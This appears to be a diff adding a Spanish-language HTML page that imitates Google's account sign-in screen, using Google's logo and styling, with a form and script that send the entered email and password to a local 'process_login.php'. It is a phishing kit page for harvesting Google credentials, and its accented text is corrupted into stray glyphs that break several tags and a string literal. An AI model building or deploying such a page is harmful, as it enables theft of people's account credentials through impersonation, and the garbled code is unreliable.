@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesi󮠭 Cuenta de Google</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fff;
+            color: #202124;
+            font-size: 14px;
+            line-height: 1.4286;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        header {
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo img {
+            height: 40px;
+        }
+        
+        .nav-links a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 15px;
+            font-size: 13px;
+        }
+        
+        .nav-links a:hover {
+            text-decoration: underline;
+        }
+        
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            margin: 0 auto;
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .login-header h1 {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            color: #202124;
+        }
+        
+        .login-header p {
+            font-size: 16px;
+            font-weight: 400;
+            letter-spacing: 0.1px;
+            line-height: 1.5;
+            color: #202124;
+            margin-top: 8px;
+        }
+        
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .input-group {
+            margin-bottom: 24px;
+        }
+        
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            height: 54px;
+            padding: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.3s;
+        }
+        
+        input[type="email"]:focus, input[type="password"]:focus {
+            border: 2px solid #1a73e8;
+        }
+        
+        .forgot-email {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 8px;
+            display: inline-block;
+        }
+        
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+        
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .next-button:hover {
+            background-color: #1765cc;
+        }
+        
+        footer {
+            background-color: #f2f2f2;
+            padding: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-right: 15px;
+            font-size: 12px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 600px) {
+            .login-container {
+                border: none;
+                padding: 24px;
+            }
+            
+            header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .nav-links {
+                margin-top: 15px;
+            }
+            
+            footer {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .footer-links {
+                justify-content: center;
+                margin-bottom: 10px;
+            }
+        }
+        
+        /* Mensaje de confirmaci󮠪/
+        .message {
+            text-align: center;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            display: none;
+        }
+        
+        .success {
+            background-color: #e6f4ea;
+            color: #137333;
+        }
+        
+        .error {
+            background-color: #fce8e6;
+            color: #c5221f;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+            </div>
+            <div class="nav-links">
+                <a href="#">Ayuda</a>
+                <a href="#">Privacidad</a>
+                <a href="#">Condiciones</a>
+            </div>
+        </header>
+        
+        <main>
+            <div class="login-container">
+                <div id="message" class="message" style="display: none;"></div>
+                
+                <div class="login-header">
+                    <h1>Iniciar sesi󮼯h1>
+                    <p>Usa tu cuenta de Google</p>
+                </div>
+                
+                <form id="loginForm" class="login-form" action="process_login.php" method="POST">
+                    <div class="input-group">
+                        <input type="email" id="email" name="email" placeholder="Correo electr󮩣o o telꧯno" required autofocus>
+                        <a href="#" class="forgot-email">ࠈas olvidado tu correo electr󮩣o?</a>
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="password" id="password" name="password" placeholder="Contrase񡢠required>
+                    </div>
+                    
+                    <div class="actions">
+                        <a href="#" class="create-account">Crear cuenta</a>
+                        <button type="submit" class="next-button">Siguiente</button>
+                    </div>
+                </form>
+            </div>
+        </main>
+        
+        <footer>
+            <div class="footer-links">
+                <a href="#">Espa񯬠(Espa񡩼/a>
+                <a href="#">Ayuda</a>
+                <a href="#">Privacidad</a>
+                <a href="#">Condiciones</a>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const form = e.target;
+            const formData = new FormData(form);
+            const messageDiv = document.getElementById('message');
+            
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    messageDiv.textContent = data.message;
+                    messageDiv.className = 'message success';
+                    messageDiv.style.display = 'block';
+                    form.reset();
+                } else {
+                    messageDiv.textContent = data.message || 'Error al procesar la solicitud';
+                    messageDiv.className = 'message error';
+                    messageDiv.style.display = 'block';
+                }
+            })
+            .catch(error => {
+                messageDiv.textContent = 'Error de conexi󮧻
+                messageDiv.className = 'message error';
+                messageDiv.style.display = 'block';
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
